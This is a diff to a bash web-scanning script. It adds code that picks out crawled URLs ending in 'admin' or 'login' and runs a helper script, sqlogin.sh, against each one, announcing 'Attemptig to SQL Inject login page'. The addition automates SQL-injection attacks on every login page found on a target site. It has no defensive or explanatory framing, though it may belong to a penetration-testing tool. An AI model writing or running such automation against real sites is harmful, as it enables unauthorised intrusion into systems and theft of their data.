@@ -116,6 +116,20 @@ collect_urls() {
 # Read URL list into array
 echo "Collecting URLs from: $url"
 IFS=$'\n' read -r -d '' -a urlList <<< "$(collect_urls "$url")"
+#Create a list of login pages
+IFS=$'\n' loginPages=($(printf "%s\n" "${urlList[@]}" | grep -iE "(admin|login)$"))
+
+# To echo ALL login pages:
+echo "-----------Login Pages found (${#loginPages[@]})---"
+for adminUrl in "${loginPages[@]}"; do
+	echo "Attemptig to SQL Inject login page"
+    #echo "$adminUrl"
+    "$SCRIPT_DIR/sqlogin.sh" "$adminUrl"
+done
+sleep 2
+
+
+
 
 if [[ ${#urlList[@]} -eq 0 ]]; then
     echo -e "${YELLOW}No URLs collected, using base URL${NC}"
